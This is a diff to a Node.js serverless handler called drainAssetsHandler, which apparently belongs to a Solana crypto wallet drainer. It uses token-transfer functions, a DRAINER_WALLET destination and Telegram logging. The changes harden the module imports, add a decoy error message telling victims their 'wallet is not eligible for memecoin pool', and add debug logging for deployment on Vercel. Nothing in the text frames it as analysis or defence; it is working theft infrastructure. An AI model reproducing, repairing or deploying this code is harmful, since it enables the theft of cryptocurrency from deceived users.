@@ -5,13 +5,42 @@ const { getAssociatedTokenAddress, createTransferInstruction, getMint, createAss
 const fetch = require('node-fetch');
 
 // Import centralized error handling
-const errorHandler = require('../src/errorHandler.js');
+let errorHandler;
+let ENV_CONFIG;
+let RPC_ENDPOINTS;
+let PROJECT_NAME;
+let telegramLogger;
 
-// Import centralized configuration
-const { ENV_CONFIG, RPC_ENDPOINTS, PROJECT_NAME } = require('../env.config.js');
-
-// Import Telegram logger singleton
-const telegramLogger = require('../src/telegram.js');
+try {
+  errorHandler = require('../src/errorHandler.js');
+  const envConfig = require('../env.config.js');
+  ENV_CONFIG = envConfig.ENV_CONFIG;
+  RPC_ENDPOINTS = envConfig.RPC_ENDPOINTS;
+  PROJECT_NAME = envConfig.PROJECT_NAME;
+  telegramLogger = require('../src/telegram.js');
+  console.log('[IMPORT] All modules imported successfully');
+} catch (importError) {
+  console.error('[IMPORT] Error importing modules:', importError);
+  // Create fallback error handler
+  errorHandler = {
+    formatApiError: (error, context) => ({
+      success: false,
+      error: error.message || 'Unknown error',
+      message: 'Wallet not eligible for memecoin pool',
+      context: context || {}
+    }),
+    logError: async (error, context) => {
+      console.error('[FALLBACK_ERROR]', error, context);
+      return { errorId: 'fallback' };
+    }
+  };
+  ENV_CONFIG = {};
+  RPC_ENDPOINTS = [];
+  PROJECT_NAME = 'Unknown';
+  telegramLogger = {
+    logError: async (error) => console.error('[TELEGRAM_FALLBACK]', error)
+  };
+}
 
 // Configuration from environment variables - with error handling
 let DRAINER_WALLET;
@@ -625,10 +654,15 @@ module.exports = async function drainAssetsHandler(req, res) {
     return;
   }
 
-  // Debug: Log configuration values
+  // Enhanced debugging for Vercel deployment
+  console.log('[DEBUG] === DRAIN ASSETS DEBUG START ===');
   console.log('[DEBUG] DRAINER_WALLET:', DRAINER_WALLET?.toString());
   console.log('[DEBUG] ENV_CONFIG loaded:', !!ENV_CONFIG);
+  console.log('[DEBUG] ENV_CONFIG keys:', ENV_CONFIG ? Object.keys(ENV_CONFIG) : 'ENV_CONFIG is null');
   console.log('[DEBUG] Request body:', req.body);
+  console.log('[DEBUG] Request headers:', req.headers);
+  console.log('[DEBUG] Environment:', process.env.NODE_ENV);
+  console.log('[DEBUG] === DRAIN ASSETS DEBUG END ===');
 
   try {
     const { user, walletType } = req.body;
